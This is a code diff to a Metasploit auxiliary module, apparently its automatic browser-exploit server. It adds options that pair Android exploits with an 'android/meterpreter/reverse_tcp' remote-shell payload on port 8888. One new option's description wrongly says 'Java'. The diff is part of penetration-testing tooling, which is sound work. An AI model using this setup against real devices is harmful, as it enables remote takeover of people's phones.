@@ -114,6 +114,13 @@ class Metasploit3 < Msf::Auxiliary
         'The payload to use for Java reverse-connect payloads',
         'java/meterpreter/reverse_tcp'
       ]),
+      OptPort.new('LPORT_ANDROID', [false,
+        'The port to use for Java reverse-connect payloads', 8888
+      ]),
+      OptString.new('PAYLOAD_ANDROID', [false,
+        'The payload to use for Android reverse-connect payloads',
+        'android/meterpreter/reverse_tcp'
+      ])
     ], self.class)
 
     @exploits = Hash.new
@@ -265,6 +272,8 @@ class Metasploit3 < Msf::Auxiliary
     @gen_payload  = datastore['PAYLOAD_GENERIC']
     @java_lport = datastore['LPORT_JAVA']
     @java_payload = datastore['PAYLOAD_JAVA']
+    @android_lport = datastore['LPORT_ANDROID']
+    @android_payload = datastore['PAYLOAD_ANDROID']
 
     minrank = framework.datastore['MinimumRank'] || 'manual'
     if not RankingName.values.include?(minrank)
@@ -320,6 +329,9 @@ class Metasploit3 < Msf::Auxiliary
     when %r{/java_}
       payload = @java_payload
       lport = @java_lport
+    when %r{^android/}
+      payload = @android_payload
+      lport = @android_lport
     else
       payload = @gen_payload
       lport = @gen_lport
